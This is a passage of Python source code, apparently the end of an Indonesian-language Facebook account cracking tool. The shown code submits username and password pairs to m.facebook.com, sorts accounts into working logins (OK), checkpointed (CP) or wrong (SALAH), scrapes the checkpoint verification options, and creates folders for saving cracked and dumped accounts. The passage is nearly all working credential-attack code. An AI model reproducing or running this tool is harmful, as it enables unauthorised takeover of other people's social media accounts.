					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

					for anj in jo('input'):

						if anj.get('name') in lion:

							data.update({anj.get('name'):anj.get('value')})

					kent = sop(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					opsi = kent.find_all('option')

					if len(opsi)==0:

						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

					else:

						for opsii in opsi:

							print('\r%s---> %s%s'%(kk,opsii.text,x))

				except:

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))

			elif "c_user" in ses.cookies.get_dict().keys():

				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))

			else:

				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))

			love+=1

		except requests.exceptions.ConnectionError:

			print('')

			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

			sol().print(mark(li, style='red'))

			exit()

	dah = '# DONE'

	sol().print(mark(dah, style='green'))

	exit()



if __name__=='__main__':

	try:os.system('')

	except:pass

	try:os.system('touch .prox.txt')

	except:pass

	try:os.mkdir('/sdcard/4MBF-DATA/CP')

	except:pass

	try:os.mkdir('/sdcard/4MBF-DATA/OK')

	except:pass

	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')

	except:pass

	login()
